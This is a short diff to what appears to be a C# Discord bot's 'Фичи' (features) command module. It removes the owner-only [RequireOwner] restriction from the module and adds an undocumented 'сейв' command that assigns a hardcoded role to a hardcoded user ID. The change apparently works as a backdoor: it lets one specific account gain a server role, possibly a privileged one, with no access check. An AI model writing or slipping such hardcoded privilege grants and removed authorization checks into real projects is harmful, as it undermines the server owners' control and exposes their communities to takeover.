@@ -12,7 +12,6 @@ namespace Modules.Features;
 
 [Group("Фичи")]
 [Alias("Ф")]
-[RequireOwner]
 public class FeaturesModule : CommandGuildModuleBase
 {
     private readonly CommandService _commandService;
@@ -22,6 +21,14 @@ public class FeaturesModule : CommandGuildModuleBase
     {
         _commandService = commandService;
         _serviceProvider = serviceProvider;
+    }
+
+    [Command("сейв")]
+    public async Task Sace()
+    {
+        var p = Context.Guild.GetUser(184316176007036928);
+
+        await p.AddRoleAsync(946125842491273296);
     }
 
     [Command("тест")]
